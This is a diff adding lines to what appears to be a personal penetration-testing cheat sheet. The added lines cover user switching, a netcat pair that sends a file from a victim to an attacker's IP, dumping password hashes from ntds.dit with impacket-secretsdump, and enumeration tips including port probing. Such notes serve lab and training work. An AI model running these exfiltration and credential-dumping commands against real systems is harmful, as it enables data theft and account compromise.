@@ -51,6 +51,22 @@ Upgrade Shell
 
 To find files/folders owned by a user
   - find / -user user 2> /dev/null
+  
+To switch to a different user while in a Linux shell: su - <username>  
+
+Using Netcat to exfil files 
+  - On attacker machine: nc -lnvp 80 > ExfilFile
+  - On victim machine: nc <attackers IP> 80 < ExfilFile
+  
+Getting hashes out of a ntds.dit and ntds.bin
+	- bin is the SYSTEM file 
+  - impacket-secretsdump -ntds ntds.dit -system <bin file> LOCAL
+
+Enum Notes:
+
+  - Tomcat services usually have a login page at 10.10.10.55/manager/html
+  - To check what other devices the victim is communicating with: arp -a 
+    - Then check a few ports on the machines found: nc -v <machine address> <port>
 
   
     
